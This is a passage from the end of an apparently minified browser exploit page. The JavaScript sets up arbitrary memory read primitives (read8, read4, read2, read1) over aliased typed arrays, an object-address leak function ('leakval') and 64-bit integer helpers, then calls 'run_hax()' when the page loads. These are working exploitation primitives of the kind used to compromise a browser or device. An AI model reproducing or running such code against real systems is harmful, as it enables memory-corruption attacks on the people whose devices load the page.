e=4294967040&nr[0];n instanceof int64?nr[0]=255&n.low|e:nr[0]=255&n|e},read8:function(r){return rr[4]=r.low,rr[5]=r.hi,new int64(nr[0],nr[1])},read4:function(r){return rr[4]=r.low,rr[5]=r.hi,nr[0]},read2:function(r){return rr[4]=r.low,rr[5]=r.hi,65535&nr[0]},read1:function(r){return rr[4]=r.low,rr[5]=r.hi,255&nr[0]},leakval:function(r){return Y.obj=r,new int64(x[4],x[5])}};window.p=ar,run_hax()}</script></body></html>
